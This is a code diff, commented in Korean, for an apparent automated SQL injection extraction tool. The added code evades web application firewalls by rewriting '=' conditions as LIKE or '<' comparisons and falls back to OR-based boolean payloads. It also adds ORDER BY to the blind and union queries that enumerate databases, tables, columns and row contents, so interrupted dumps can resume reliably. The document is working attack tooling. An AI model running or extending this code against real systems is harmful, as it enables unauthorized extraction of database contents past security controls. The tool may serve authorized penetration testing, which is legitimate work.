@@ -33,6 +33,7 @@ from modules._sqli_util import (
     build_dynamic_contexts,
     gen_marker,
 )
+from modules._excel_safe import safe_cell, FORMULA_PREFIXES
 
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
@@ -41,6 +42,18 @@ urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
 # WAF 결합 검출용 status code (body 키워드와 OR 결합)
 WAF_STATUS_CODES = frozenset({403, 406, 419, 429, 503})
+
+# WAF 차단 페이지가 리다이렉트시키는 도메인 — HTTP 3xx / 본문 내 리다이렉트 모두 대상
+WAF_REDIRECT_DOMAINS = frozenset({"kuipernet.com"})
+
+
+def _host_matches_waf_redirect(host: Optional[str]) -> bool:
+    """host가 WAF_REDIRECT_DOMAINS의 도메인 또는 그 서브도메인인지 확인.
+
+    "www.kuipernet.com" / "kuipernet.com" / "a.b.kuipernet.com" 모두 매칭.
+    """
+    host = (host or "").lower()
+    return any(host == d or host.endswith("." + d) for d in WAF_REDIRECT_DOMAINS)
 
 # UNION-based visible 컬럼 마커 — 응답 본문에서 추출값을 격리
 # SecTest prefix로 응답 디버깅 시 도구 흔적 즉시 식별 가능. _char_encode_str로 CHAR/CHR
@@ -136,7 +149,6 @@ _INVALID_FILE_CHARS  = re.compile(r'[\\/:\*\?"<>\|\x00-\x1f]')
 _RESERVED_FILENAMES  = {"CON", "PRN", "AUX", "NUL",
                         *(f"COM{i}" for i in range(1, 10)),
                         *(f"LPT{i}" for i in range(1, 10))}
-_FORMULA_PREFIX      = ("=", "+", "-", "@", "\t", "\r")
 RESERVED_SHEETS      = {"INFO", "_TABLEMAP"}
 
 
@@ -148,6 +160,12 @@ class WAFBlockedError(Exception):
 
 class UnsupportedTechniqueError(Exception):
     """현재 DBMS / 컨텍스트에서 선택한 기법을 사용할 수 없을 때 발생한다."""
+
+
+class _ContextDetectFailed(UnsupportedTechniqueError):
+    """컨텍스트(quote_context/position) 자동 탐지 실패 전용 — fingerprint()의 LIKE 폴백
+    트리거 판별에 사용한다. UnsupportedTechniqueError를 상속하므로 이 예외를 별도로
+    처리하지 않는 기존 호출부에서도 동일하게 처리된다."""
 
 
 # ── ExtractCtx ──────────────────────────────────────────────────────────────
@@ -199,6 +217,15 @@ class ExtractCtx:
     union_visible_manual: Optional[int] = None
     # UNION 행 묶음 크기 — 1이면 기존 1행씩, N이면 N행을 집계 함수로 한 요청에 추출
     union_row_batch: int = 1
+    # Boolean-blind "where" 위치 논리 연산자. _detect_context가 자동 결정.
+    # "AND"(기본) — 원본 쿼리가 결과를 반환하는 일반적인 경우.
+    # "OR" — 원본 파라미터 값이 애초에 빈 결과를 반환해 AND 1=1/1=2가 구분되지 않을 때 폴백.
+    bool_operator: str = "AND"
+    # WAF가 '=' 자체를 탐지·차단할 때의 자동 폴백 플래그. fingerprint가 '=' 기반
+    # 판별식(1=1 등)으로 컨텍스트 탐지에 실패하면(WAF 차단 포함) 이 값을 True로
+    # 전환해 재시도한다 — boolean 기법 전용. False(기본)면 기존 '=' 방식 그대로.
+    # True 전환 시 판별식은 문자열 LIKE로, 이분탐색 비교는 '=' 없는 부등호로 바뀐다.
+    use_like: bool = False
 
     # Boolean-blind baseline 캐시
     baseline_resp_text: Optional[str] = None
@@ -443,8 +470,15 @@ def _send(ctx: ExtractCtx, payload: str,
             continue
 
         # 사후 검증 — redirect 후 외부 도메인 이탈 차단
-        if urlparse(resp.url).netloc != ctx.allowed_netloc:
-            raise ValueError(f"redirect to external domain: {urlparse(resp.url).netloc}")
+        final_netloc = urlparse(resp.url).netloc
+        if final_netloc != ctx.allowed_netloc:
+            # 리다이렉트 체인(중간 hop 포함) 어디든 WAF 차단 도메인이면 WAF 판정 —
+            # 그 외 낯선 외부 도메인은 기존대로 유출 차단(ValueError)
+            hop_hosts = [urlparse(h.url).hostname for h in resp.history]
+            hop_hosts.append(urlparse(resp.url).hostname)
+            if any(_host_matches_waf_redirect(h) for h in hop_hosts):
+                raise WAFBlockedError(f"WAF blocked (redirect: {final_netloc})")
+            raise ValueError(f"redirect to external domain: {final_netloc}")
 
         # 429/503 자동 감속 (1회 한정)
         if resp.status_code in (429, 503):
@@ -466,6 +500,11 @@ def _send(ctx: ExtractCtx, payload: str,
             for kw in WAF_KEYWORDS:
                 if kw in body_lower and kw not in ctx.waf_baseline_kws:
                     raise WAFBlockedError(f"WAF blocked (body keyword: {kw})")
+            # 본문 내 리다이렉트(meta refresh / JS location) — 차단 도메인 문자열이
+            # 응답 본문에 직접 박혀 오는 경우 (HTTP 3xx가 아니므로 위 사후 검증으로는 못 잡음)
+            for d in WAF_REDIRECT_DOMAINS:
+                if d in body_lower:
+                    raise WAFBlockedError(f"WAF blocked (body redirect: {d})")
 
         return resp
 
@@ -490,11 +529,25 @@ def _send_fingerprint(ctx: ExtractCtx, payload: str) -> requests.Response:
         ctx.delay = saved
 
 
+def _eq_expr(ctx: ExtractCtx, lhs: str, rhs: str) -> str:
+    """참/거짓 판별식 조립 — WAF가 '='을 탐지하는 환경에서는 LIKE로 우회.
+
+    ctx.use_like=False(기본): "{lhs}={rhs}" (기존 방식)
+    ctx.use_like=True:        "'{lhs}' LIKE '{rhs}'" — 양변을 문자열 리터럴로 감싸
+    PostgreSQL 등 정수 LIKE를 허용하지 않는 DBMS에서도 동일하게 동작한다.
+    lhs/rhs는 항상 리터럴 정수(1, 0, 2 등)만 전달되므로 따옴표 삽입이 안전하다.
+    """
+    if ctx.use_like:
+        return f"'{lhs}' LIKE '{rhs}'"
+    return f"{lhs}={rhs}"
+
+
 # ── Boolean baseline 캡처 ───────────────────────────────────────────────────
 
 def _capture_baseline(ctx: ExtractCtx) -> None:
     """페이로드 없는 원본 요청 2회 → baseline_resp_text + dynamic_contexts 채움.
-    이어서 AND (1=1) / AND (1=0) reference 응답을 캡처해 dual baseline 비교에 사용.
+    이어서 {AND|OR} (1=1) / {AND|OR} (1=0) reference 응답을 캡처해 dual baseline 비교에 사용
+    (연산자는 ctx.bool_operator — _detect_context가 이미 결정한 값을 그대로 사용).
 
     - 두 baseline 응답의 diff를 _build_dynamic_contexts로 분석하여 동적 콘텐츠
       (세션 ID/타임스탬프/nonce 등) 마스킹 컨텍스트 수집
@@ -510,13 +563,14 @@ def _capture_baseline(ctx: ExtractCtx) -> None:
     ctx.waf_baseline_kws = [kw for kw in WAF_KEYWORDS if kw in body_lower]
 
     # true / false reference 캡처 — quote_context는 fingerprint 시점에 이미 결정됨
+    # (_eq_expr: ctx.use_like=True면 '=' 대신 LIKE 판별식 사용)
     try:
-        true_resp = _send(ctx, _build_blind_compare_payload(ctx, "1=1"))
+        true_resp = _send(ctx, _build_blind_compare_payload(ctx, _eq_expr(ctx, "1", "1")))
         ctx.true_ref_text = true_resp.text
     except Exception:
         ctx.true_ref_text = None
     try:
-        false_resp = _send(ctx, _build_blind_compare_payload(ctx, "1=0"))
+        false_resp = _send(ctx, _build_blind_compare_payload(ctx, _eq_expr(ctx, "1", "0")))
         ctx.false_ref_text = false_resp.text
     except Exception:
         ctx.false_ref_text = None
@@ -584,17 +638,24 @@ def _detect_context(ctx: ExtractCtx) -> Optional[str]:
     ctx.position=None이면 위치 후보를 탐지; boolean 기법 전용으로 Phase 2를 추가 탐지한다.
 
     탐지 순서:
-      Phase 1 — "where": AND 1=1/1=2 응답 차이(① Boolean 판정) + ② 에러 전이 판정.
+      Phase 1 — "where": AND 1=1/1=2 응답 차이(① Boolean 판정, 실패 시 OR 1=1/1=2 폴백)
+               + ② 에러 전이 판정.
       Phase 2 — "where_case" → "orderby": CASE WHEN 에러 오라클
                (ctx.technique=="boolean" 이고 ctx.dbms가 COND_ERR_SUBQUERY에 있을 때만).
 
-    채택 시 ctx.quote_context + ctx.position 갱신. 실패 시 None 반환 + ctx 복원.
+    AND 폴백 배경: 원본 파라미터 값이 애초에 빈 결과를 반환하는 쿼리라면
+    AND 1=1 / AND 1=2 둘 다 빈 응답으로 동일해 Boolean 판정이 불가능하다.
+    이 경우 OR 1=1(전체 행 반환)과 OR 1=2(원본 그대로)는 서로 달라 구분 가능하므로
+    ctx.bool_operator를 "OR"로 전환해 재시도한다.
+
+    채택 시 ctx.quote_context + ctx.position + ctx.bool_operator 갱신. 실패 시 None 반환 + ctx 복원.
     """
     auto_qc  = ctx.quote_context is None
     auto_pos = ctx.position is None
 
     saved_qc       = ctx.quote_context
     saved_pos      = ctx.position
+    saved_op       = ctx.bool_operator
     saved_baseline = ctx.baseline_resp_text
     saved_dyn      = ctx.dynamic_contexts
     saved_kws      = ctx.waf_baseline_kws
@@ -616,16 +677,33 @@ def _detect_context(ctx: ExtractCtx) -> Optional[str]:
                 ctx.position = pos
 
                 if pos == "where":
+                    ctx.bool_operator = "AND"
                     # ① Boolean 판정 — AND 1=1 / AND 1=2 응답 차이
+                    # (_eq_expr: ctx.use_like=True면 '1'='1' 대신 '1' LIKE '1' 형태로 대체)
                     try:
-                        r_true  = _send_fingerprint(ctx, f"{cand} AND 1=1 -- ")
-                        r_false = _send_fingerprint(ctx, f"{cand} AND 1=2 -- ")
+                        r_true  = _send_fingerprint(ctx, f"{cand} AND {_eq_expr(ctx, '1', '1')} -- ")
+                        r_false = _send_fingerprint(ctx, f"{cand} AND {_eq_expr(ctx, '1', '2')} -- ")
                     except WAFBlockedError:
                         raise
                     except Exception:
                         continue
                     if similarity(r_true.text, r_false.text) < 0.9:
                         return cand
+                    # ①' AND 폴백 — 원본 값이 빈 결과라 AND 1=1/1=2가 구분 안 될 때 OR로 재시도.
+                    # boolean 기법 전용(error/union의 quote_context 탐지는 기존 AND 방식 유지).
+                    if ctx.technique == "boolean":
+                        try:
+                            r_or_true  = _send_fingerprint(ctx, f"{cand} OR {_eq_expr(ctx, '1', '1')} -- ")
+                            r_or_false = _send_fingerprint(ctx, f"{cand} OR {_eq_expr(ctx, '1', '2')} -- ")
+                        except WAFBlockedError:
+                            raise
+                        except Exception:
+                            r_or_true = r_or_false = None
+                        if (r_or_true is not None
+                                and similarity(r_or_true.text, r_or_false.text) < 0.9):
+                            ctx.bool_operator = "OR"
+                            return cand
+                        ctx.bool_operator = "AND"
                     # ② 에러 전이 판정 (numeric 후보·종결 후 에러 있는 경우 제외)
                     if not cand or _match_error_signature(r_true.text) is not None:
                         continue
@@ -642,8 +720,8 @@ def _detect_context(ctx: ExtractCtx) -> Optional[str]:
                     # CASE WHEN 에러 오라클 판정
                     # TRUE → 정상 응답(에러 없음), FALSE → 다중행 서브쿼리 에러
                     try:
-                        r_true  = _send_fingerprint(ctx, _build_blind_compare_payload(ctx, "1=1"))
-                        r_false = _send_fingerprint(ctx, _build_blind_compare_payload(ctx, "1=2"))
+                        r_true  = _send_fingerprint(ctx, _build_blind_compare_payload(ctx, _eq_expr(ctx, "1", "1")))
+                        r_false = _send_fingerprint(ctx, _build_blind_compare_payload(ctx, _eq_expr(ctx, "1", "2")))
                     except WAFBlockedError:
                         raise
                     except Exception:
@@ -655,6 +733,7 @@ def _detect_context(ctx: ExtractCtx) -> Optional[str]:
     # 전 후보 탈락 — ctx 복원 후 None 반환
     ctx.quote_context      = saved_qc
     ctx.position           = saved_pos
+    ctx.bool_operator      = saved_op
     ctx.baseline_resp_text = saved_baseline
     ctx.dynamic_contexts   = saved_dyn
     ctx.waf_baseline_kws   = saved_kws
@@ -758,6 +837,45 @@ def _detect_union_visible(ctx: ExtractCtx) -> int:
 def fingerprint(ctx: ExtractCtx,
                 progress_cb: Optional[Callable[[int, int], None]] = None
                 ) -> ExtractCtx:
+    """_fingerprint_run 실행 + WAF의 '=' 탐지에 대한 LIKE 자동 폴백 래퍼.
+
+    boolean 기법에서 컨텍스트 자동 탐지 실패(_ContextDetectFailed) 또는 WAFBlockedError가
+    발생하면, '=' 판별식이 WAF에 차단되었을 가능성을 의심해 ctx.use_like=True로 전환 후
+    1회 재시도한다(그 이상 재귀하지 않음 — 재시도도 실패하면 그대로 전파).
+    error/union 기법 또는 이미 use_like=True인 경우는 폴백 없이 그대로 전파한다.
+    재시도 전 quote_context/position/bool_operator 및 baseline 캐시를 호출 시점 값으로
+    되돌려 자동 탐지가 처음부터 다시 진행되도록 한다. 폴백 발생 사실은 서버 콘솔 로그로만
+    남기고(결과 화면·엑셀 meta에는 노출하지 않음) 이후 흐름은 기존과 동일하다.
+    """
+    orig_quote_context = ctx.quote_context
+    orig_position = ctx.position
+    orig_bool_operator = ctx.bool_operator
+    try:
+        return _fingerprint_run(ctx, progress_cb=progress_cb)
+    except (WAFBlockedError, _ContextDetectFailed):
+        if ctx.technique != "boolean" or ctx.use_like:
+            raise
+        print("  [!] SQLi 추출: '=' 판별식이 WAF에 차단된 것으로 의심되어 "
+              "LIKE 방식으로 전환 후 fingerprint를 재시도합니다.")
+        # 자동 탐지 대상 필드를 호출 시점 값으로 복원 — 처음부터 재탐지
+        ctx.quote_context = orig_quote_context
+        ctx.position = orig_position
+        ctx.bool_operator = orig_bool_operator
+        ctx.baseline_resp_text = None
+        ctx.dynamic_contexts = []
+        ctx.waf_baseline_kws = []
+        ctx.true_ref_text = None
+        ctx.false_ref_text = None
+        ctx.masked_true_ref = None
+        ctx.masked_false_ref = None
+        ctx.masked_baseline = None
+        ctx.use_like = True
+        return _fingerprint_run(ctx, progress_cb=progress_cb)
+
+
+def _fingerprint_run(ctx: ExtractCtx,
+                     progress_cb: Optional[Callable[[int, int], None]] = None
+                     ) -> ExtractCtx:
     """컨텍스트·위치·DBMS를 식별하여 ctx를 갱신한다.
 
     technique은 fingerprint가 자동 선택하지 않는다 — 사용자 입력 시점에 이미
@@ -798,7 +916,8 @@ def fingerprint(ctx: ExtractCtx,
     if need_detect:
         detected = _detect_context(ctx)
         if detected is None:
-            raise UnsupportedTechniqueError("컨텍스트 자동 탐지 실패 — 수동 지정 필요")
+            # fingerprint()의 LIKE 폴백이 이 실패만 선별해 재시도하도록 전용 예외 사용
+            raise _ContextDetectFailed("컨텍스트 자동 탐지 실패 — 수동 지정 필요")
         ctx.quote_context = detected
     if ctx.position is None:
         ctx.position = "where"  # boolean 비기법 또는 position 수동 지정 시 기본값
@@ -843,9 +962,10 @@ def fingerprint(ctx: ExtractCtx,
             raise UnsupportedTechniqueError(f"{_label} 기법으로 추출할 수 없습니다.")
     elif ctx.technique == "boolean":
         # true/false 응답 구분 검증 — 같으면 boolean 추출 불가
+        # (_eq_expr: ctx.use_like=True면 '=' 대신 LIKE 판별식 사용)
         try:
-            _true_result  = _blind_compare(ctx, "1=1")
-            _false_result = _blind_compare(ctx, "1=2")
+            _true_result  = _blind_compare(ctx, _eq_expr(ctx, "1", "1"))
+            _false_result = _blind_compare(ctx, _eq_expr(ctx, "1", "2"))
         except (WAFBlockedError, InterruptedError):
             raise
         except Exception:
@@ -976,12 +1096,18 @@ def _extract_long_string(ctx: ExtractCtx, query: str) -> str:
 def _build_blind_compare_payload(ctx: ExtractCtx, condition: str) -> str:
     """Boolean true/false 판정용 페이로드 — position에 따라 구조 분기.
 
-    where      : {qc} AND ({condition}) --
+    where      : {qc} {AND|OR} ({condition}) --   (연산자는 ctx.bool_operator, 기본 AND)
     where_case : {qc} AND 1=(CASE WHEN ({condition}) THEN 1 ELSE {err} END) --
+                 (ctx.use_like=True면 "1=" 대신 "'1' LIKE" — THEN 분기도 '1' 리터럴로 통일)
     orderby    : {qc},(CASE WHEN ({condition}) THEN 1 ELSE {err} END) --
     custom     : ctx.blind_template의 {cond}를 condition으로 치환 (qc·구조 모두 사용자 정의)
 
-    where_case / orderby는 condition=true → 정상 응답, false → 다중행 서브쿼리 에러 응답.
+    where_case / orderby는 condition=true → 정상 응답, false → 다중행 서브쿼리 에러 응답
+    (에러가 CASE 자체에서 강제 발생하므로 원본 쿼리의 행 존재 여부와 무관 — bool_operator 불필요).
+    orderby는 정렬 키로 CASE 결과를 사용할 뿐 비교 연산자가 없어 use_like 영향 없음.
+
+    "where" 위치는 원본 파라미터 값이 애초에 빈 결과를 반환하는 쿼리면 AND로는 true/false
+    응답이 구분되지 않아 OR로 전환해야 한다. ctx.bool_operator는 _detect_context가 자동 결정.
     """
     qc  = ctx.quote_context
     pos = ctx.position or "where"
@@ -991,10 +1117,14 @@ def _build_blind_compare_payload(ctx: ExtractCtx, condition: str) -> str:
     if pos in ("where_case", "orderby"):
         err_sub = COND_ERR_SUBQUERY[ctx.dbms]
         if pos == "where_case":
+            # where_case만 "1=" 비교 자체를 가지므로 use_like 시 LHS·THEN 모두 '1' 문자열로 통일
+            if ctx.use_like:
+                return f"{qc} AND '1' LIKE (CASE WHEN ({condition}) THEN '1' ELSE {err_sub} END) -- "
             return f"{qc} AND 1=(CASE WHEN ({condition}) THEN 1 ELSE {err_sub} END) -- "
+        # orderby는 정렬 키로만 쓰여 비교 연산자가 없으므로 use_like와 무관하게 동일
         return f"{qc},(CASE WHEN ({condition}) THEN 1 ELSE {err_sub} END) -- "
-    # "where" (기존)
-    return f"{qc} AND ({condition}) -- "
+    # "where" (기존 AND / 빈 결과 대상 OR 폴백)
+    return f"{qc} {ctx.bool_operator} ({condition}) -- "
 
 
 def _blind_compare(ctx: ExtractCtx, condition: str) -> bool:
@@ -1023,11 +1153,14 @@ def _blind_compare(ctx: ExtractCtx, condition: str) -> bool:
         return sim_true > sim_false
 
     # fallback: 단일 baseline 비교 (캐시 없는 환경 — _capture_baseline 미실행)
+    # baseline은 페이로드 없는 원본 요청 응답 — AND 모드에서는 원본이 행을 반환하는
+    # true-상태에 해당하지만, OR 모드는 원본이 빈 결과인 false-상태이므로 판정을 반전한다.
     masked_base = (ctx.masked_baseline
                    if ctx.masked_baseline is not None
                    else apply_dynamic_mask(ctx.baseline_resp_text or "",
                                           ctx.dynamic_contexts))
-    return similarity(masked_base, masked_resp) >= BLIND_SIM_THRESHOLD
+    is_similar = similarity(masked_base, masked_resp) >= BLIND_SIM_THRESHOLD
+    return (not is_similar) if ctx.bool_operator == "OR" else is_similar
 
 
 def _blind_int(ctx: ExtractCtx, expr: str, max_value: int = 1_000_000) -> Optional[int]:
@@ -1037,7 +1170,10 @@ def _blind_int(ctx: ExtractCtx, expr: str, max_value: int = 1_000_000) -> Option
     """
     if _blind_compare(ctx, f"({expr}) IS NULL"):
         return None
-    if _blind_compare(ctx, f"({expr})=0"):
+    # WAF가 '='을 탐지하는 환경(ctx.use_like)에서는 0 판정을 '<1'로 대체 — 이 함수가
+    # 다루는 expr(LENGTH/COUNT)은 항상 0 이상이므로 '=' 없이도 동일하게 판정 가능.
+    zero_check = f"({expr})<1" if ctx.use_like else f"({expr})=0"
+    if _blind_compare(ctx, zero_check):
         return 0
 
     # 상한 탐색 — 2배씩 증가
@@ -1073,7 +1209,10 @@ def _blind_char_in_range(ctx: ExtractCtx, expr: str, pos: int,
         if ctx.cancelled:
             return lo
         mid = (lo + hi) // 2
-        if _blind_compare(ctx, f"({char_expr})<={mid}"):
+        # WAF가 '='을 탐지하는 환경(ctx.use_like)에서는 '<=mid'를 '<(mid+1)'로 대체
+        # — 정수 비교이므로 의미는 동일하고 '=' 문자만 제거된다.
+        cmp_expr = f"({char_expr})<{mid + 1}" if ctx.use_like else f"({char_expr})<={mid}"
+        if _blind_compare(ctx, cmp_expr):
             hi = mid
         else:
             lo = mid + 1
@@ -1238,7 +1377,10 @@ def _q_count_databases(dbms: str) -> str:
 
 def _q_row_databases(dbms: str, n: int) -> str:
     if dbms in ("MySQL", "MariaDB"):
-        return f"SELECT schema_name FROM information_schema.schemata LIMIT 1 OFFSET {n}"
+        # ORDER BY 없으면 재개(다른 세션에서 offset 이어받기) 시 DB 순서가 흔들려
+        # 항목 누락/중복 위험 — _q_base_databases(배치 경로)와 동일 정렬 기준 적용
+        return (f"SELECT schema_name FROM information_schema.schemata "
+                f"ORDER BY schema_name LIMIT 1 OFFSET {n}")
     if dbms == "MSSQL":
         return (f"SELECT name FROM master.sys.databases ORDER BY name "
                 f"OFFSET {n} ROWS FETCH NEXT 1 ROWS ONLY")
@@ -1285,9 +1427,11 @@ def _q_count_tables(dbms: str, db: str) -> str:
 
 
 def _q_row_tables(dbms: str, db: str, n: int) -> str:
+    # ORDER BY는 _q_base_tables(배치 경로)와 동일 기준 — 세션을 넘긴 offset 재개 시
+    # 순서가 흔들려 항목이 누락/중복되는 것을 방지
     if dbms in ("MySQL", "MariaDB"):
         return (f"SELECT table_name FROM information_schema.tables "
-                f"WHERE table_schema='{db}' LIMIT 1 OFFSET {n}")
+                f"WHERE table_schema='{db}' ORDER BY table_name LIMIT 1 OFFSET {n}")
     if dbms == "MSSQL":
         # 전 스키마 지원 — "schema.table" 형태로 반환해 스키마 정보를 함께 전달
         return (f"SELECT SCHEMA_NAME(schema_id)+'.'+name FROM [{db}].sys.tables "
@@ -1295,13 +1439,14 @@ def _q_row_tables(dbms: str, db: str, n: int) -> str:
                 f"OFFSET {n} ROWS FETCH NEXT 1 ROWS ONLY")
     if dbms == "PostgreSQL":
         return (f"SELECT tablename FROM pg_tables WHERE schemaname='{db}' "
-                f"LIMIT 1 OFFSET {n}")
+                f"ORDER BY tablename LIMIT 1 OFFSET {n}")
     if dbms == "Oracle":
         return ("SELECT table_name FROM (SELECT table_name,ROW_NUMBER() OVER "
                 f"(ORDER BY table_name) rn FROM all_tables WHERE owner='{db}') "
                 f"WHERE rn={n+1}")
     if dbms == "SQLite":
-        return f"SELECT name FROM sqlite_master WHERE type='table' LIMIT 1 OFFSET {n}"
+        return (f"SELECT name FROM sqlite_master WHERE type='table' "
+                f"ORDER BY name LIMIT 1 OFFSET {n}")
     raise UnsupportedTechniqueError(f"Table row 미지원 DBMS: {dbms}")
 
 
@@ -1347,10 +1492,12 @@ def _q_count_columns(dbms: str, db: str, tbl: str) -> str:
 
 
 def _q_row_columns(dbms: str, db: str, tbl: str, n: int) -> str:
+    # ORDER BY는 _q_base_columns(배치 경로)와 동일 기준 — 세션을 넘긴 offset 재개 시
+    # 순서가 흔들려 항목이 누락/중복되는 것을 방지
     if dbms in ("MySQL", "MariaDB"):
         return (f"SELECT column_name FROM information_schema.columns "
                 f"WHERE table_schema='{db}' AND table_name='{tbl}' "
-                f"LIMIT 1 OFFSET {n}")
+                f"ORDER BY ordinal_position LIMIT 1 OFFSET {n}")
     if dbms == "MSSQL":
         schema, name = _mssql_split_table(tbl)
         return (f"SELECT c.name FROM [{db}].sys.columns c "
@@ -1367,7 +1514,7 @@ def _q_row_columns(dbms: str, db: str, tbl: str, n: int) -> str:
                 "OVER (ORDER BY column_id) rn FROM all_tab_columns "
                 f"WHERE owner='{db}' AND table_name='{tbl}') WHERE rn={n+1}")
     if dbms == "SQLite":
-        return f"SELECT name FROM pragma_table_info('{tbl}') LIMIT 1 OFFSET {n}"
+        return f"SELECT name FROM pragma_table_info('{tbl}') ORDER BY cid LIMIT 1 OFFSET {n}"
     raise UnsupportedTechniqueError(f"Column row 미지원 DBMS: {dbms}")
 
 
@@ -1774,24 +1921,34 @@ def _build_row_select(ctx: ExtractCtx, columns: List[str]) -> str:
 
 
 def _q_row_dump(ctx: ExtractCtx, db: str, tbl: str, row_select: str, n: int) -> str:
-    """행 단위 추출 쿼리 — DBMS별 페이지네이션 + row_select 결합."""
+    """행 단위 추출 쿼리 — DBMS별 페이지네이션 + row_select 결합.
+
+    ORDER BY는 row_select(선택 컬럼들을 결합한 표현식) 자체를 정렬 키로 재사용한다.
+    dump 대상 테이블에 안정적인 PK/고유 컬럼이 항상 있다는 보장이 없어, 선택된
+    컬럼과 무관한 별도 정렬 키를 만들 수 없다 — 대신 "같은 표현식은 같은 실행에서
+    항상 같은 순서로 정렬된다"는 성질만으로 세션을 넘긴 offset 재개(재로드 후 이어서
+    추출)가 매번 같은 오프셋에서 같은 행을 가리키게 보장한다(값이 동일한 행끼리의
+    내부 순서는 뒤바뀔 수 있으나, 그 경우 내보내는 데이터 자체가 동일하므로 무해하다).
+    ORDER BY 없이 페이지네이션할 때 DBMS가 매 실행마다 임의 순서를 반환해 행이
+    누락/중복되는 것을 방지하는 목적 — "삽입 순서 보존"이 목적이 아니다.
+    """
     qdb = _qid(ctx, db)
     qtbl = _qid(ctx, tbl)
     if ctx.dbms in ("MySQL", "MariaDB"):
-        return f"SELECT {row_select} FROM {qdb}.{qtbl} LIMIT 1 OFFSET {n}"
+        return f"SELECT {row_select} FROM {qdb}.{qtbl} ORDER BY {row_select} LIMIT 1 OFFSET {n}"
     if ctx.dbms == "MSSQL":
         schema, name = _mssql_split_table(tbl)
         return (f"SELECT {row_select} FROM {qdb}.{_qid(ctx, schema)}.{_qid(ctx, name)} "
-                f"ORDER BY (SELECT 1) OFFSET {n} ROWS FETCH NEXT 1 ROWS ONLY")
+                f"ORDER BY {row_select} OFFSET {n} ROWS FETCH NEXT 1 ROWS ONLY")
     if ctx.dbms == "PostgreSQL":
         return (f"SELECT {row_select} FROM {qdb}.{qtbl} "
-                f"LIMIT 1 OFFSET {n}")
+                f"ORDER BY {row_select} LIMIT 1 OFFSET {n}")
     if ctx.dbms == "Oracle":
         return ("SELECT col FROM (SELECT " + row_select + " AS col,"
-                "ROW_NUMBER() OVER (ORDER BY ROWNUM) rn "
+                "ROW_NUMBER() OVER (ORDER BY " + row_select + ") rn "
                 f"FROM {qdb}.{qtbl}) WHERE rn={n+1}")
     if ctx.dbms == "SQLite":
-        return f"SELECT {row_select} FROM {qtbl} LIMIT 1 OFFSET {n}"
+        return f"SELECT {row_select} FROM {qtbl} ORDER BY {row_select} LIMIT 1 OFFSET {n}"
     raise UnsupportedTechniqueError(f"row dump 미지원 DBMS: {ctx.dbms}")
 
 
@@ -1802,6 +1959,12 @@ def _q_row_dump_batch(ctx: ExtractCtx, db: str, tbl: str, row_select: str,
     기존 _q_row_dump를 서브쿼리로 감싸 집계하는 방식으로, _build_row_select 재사용.
     집계 결과가 한 셀에 담기므로 _build_union_payload/HEX 추출 경로를 그대로 사용 가능.
     MySQL 1024B·Oracle 4000B 한계 초과 시 _union_extract가 None 반환 → 호출부 폴백.
+
+    내부 페이지네이션(LIMIT/OFFSET) 서브쿼리에 ORDER BY r(=row_select)을 적용해
+    _q_row_dump와 동일한 정렬 기준을 공유한다 — 묶음 잘림 감지 후 폴백하는
+    fallback_start~fallback_end 구간이 1행씩(_q_row_dump) 경로로 같은 절대 offset을
+    다시 조회할 때 동일한 행을 가리키도록 보장하기 위함(정렬 기준이 다르면 절대
+    offset이 서로 다른 행을 가리켜 중복/누락이 발생할 수 있음).
     """
     qdb = _qid(ctx, db)
     qtbl = _qid(ctx, tbl)
@@ -1810,29 +1973,31 @@ def _q_row_dump_batch(ctx: ExtractCtx, db: str, tbl: str, row_select: str,
         # GROUP_CONCAT 기본 1024B 한계 — 초과 시 조용히 잘림 → 행 수 부족으로 폴백 탐지
         return (f"SELECT GROUP_CONCAT(r SEPARATOR '{delim}') "
                 f"FROM (SELECT {row_select} AS r "
-                f"FROM {qdb}.{qtbl} LIMIT {batch} OFFSET {offset}) sub")
+                f"FROM {qdb}.{qtbl} ORDER BY r LIMIT {batch} OFFSET {offset}) sub")
     if ctx.dbms == "MSSQL":
         # STRING_AGG은 SQL Server 2017+(v14) 이상 필요 — 이하 버전은 None 반환 → 폴백
         schema, name = _mssql_split_table(tbl)
         return (f"SELECT STRING_AGG(CAST(r AS NVARCHAR(MAX)),'{delim}') "
                 f"FROM (SELECT {row_select} AS r FROM {qdb}.{_qid(ctx, schema)}.{_qid(ctx, name)} "
-                f"ORDER BY (SELECT 1) "
+                f"ORDER BY r "
                 f"OFFSET {offset} ROWS FETCH NEXT {batch} ROWS ONLY) sub")
     if ctx.dbms == "PostgreSQL":
         return (f"SELECT STRING_AGG(r,'{delim}') "
                 f"FROM (SELECT {row_select} AS r "
-                f"FROM {qdb}.{qtbl} LIMIT {batch} OFFSET {offset}) sub")
+                f"FROM {qdb}.{qtbl} ORDER BY r LIMIT {batch} OFFSET {offset}) sub")
     if ctx.dbms == "Oracle":
         # LISTAGG는 4000B 초과 시 ORA-01489 에러 → _union_extract None → 폴백
+        # 윈도우 함수 OVER(ORDER BY ...)는 같은 SELECT 목록의 별칭(r) 참조가
+        # 신뢰할 수 없어 row_select 표현식을 그대로 반복 사용한다(_q_row_dump와 동일 방식)
         return ("SELECT LISTAGG(r,'" + delim + "') WITHIN GROUP (ORDER BY rn) "
                 f"FROM (SELECT {row_select} AS r,"
-                f"ROW_NUMBER() OVER (ORDER BY ROWNUM) rn "
+                "ROW_NUMBER() OVER (ORDER BY " + row_select + ") rn "
                 f"FROM {qdb}.{qtbl}) "
                 f"WHERE rn>{offset} AND rn<={offset+batch}")
     if ctx.dbms == "SQLite":
         return (f"SELECT GROUP_CONCAT(r,'{delim}') "
                 f"FROM (SELECT {row_select} AS r "
-                f"FROM {qtbl} LIMIT {batch} OFFSET {offset})")
+                f"FROM {qtbl} ORDER BY r LIMIT {batch} OFFSET {offset})")
     raise UnsupportedTechniqueError(f"batch row dump 미지원 DBMS: {ctx.dbms}")
 
 
@@ -2376,13 +2541,14 @@ def _safe_filename(name: str) -> str:
 
 
 def _safe_cell_value(v: Any) -> str:
-    """엑셀 formula injection 차단 — 위험 prefix는 ' 추가하여 문자열 강제."""
-    if v is None:
-        return ""
-    s = str(v)
-    if s.startswith(_FORMULA_PREFIX):
-        return "'" + s
-    return s
+    """엑셀 formula injection 차단 + 제어문자 제거 — 항상 문자열을 반환한다.
+
+    실제 구현은 _excel_safe.safe_cell() 공용 함수로 위임한다(제어문자 제거가
+    빠져 있던 기존 버그 수정 — DB 원본 덤프에 0x00~0x1f 제어바이트가 섞이면
+    openpyxl.IllegalCharacterError로 저장이 통째로 실패하던 문제).
+    excel_merge._safe_cell / recon._safe_cell과 로직 통일.
+    """
+    return safe_cell(v, stringify=True)
 
 
